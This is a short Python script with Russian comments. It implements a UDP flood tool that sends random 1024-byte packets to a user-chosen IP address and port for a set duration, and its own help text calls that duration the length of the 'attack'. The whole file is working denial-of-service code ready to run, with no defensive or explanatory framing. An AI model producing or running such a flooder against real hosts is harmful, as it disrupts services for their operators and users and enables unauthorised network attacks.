import socket
import random
import time
import argparse

def flood(target_ip, target_port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)  # Пакет размером 1024 байта
    timeout = time.time() + duration
    sent = 0

    while time.time() < timeout:
        client.sendto(bytes, (target_ip, target_port))
        sent += 1
        if sent % 100 == 0:
            print(f"{sent} пакетов отправлено на {target_ip} через порт {target_port}")

def main():
    parser = argparse.ArgumentParser(description="Программа для генерации сетевого флуда.")
    parser.add_argument("--ip", type=str, required=True, help="IP-адрес цели.")
    parser.add_argument("--port", type=int, required=True, help="Порт цели.")
    parser.add_argument("--duration", type=int, required=True, help="Продолжительность атаки в секундах.")

    args = parser.parse_args()

    flood(args.ip, args.port, args.duration)

if __name__ == "__main__":
    main()
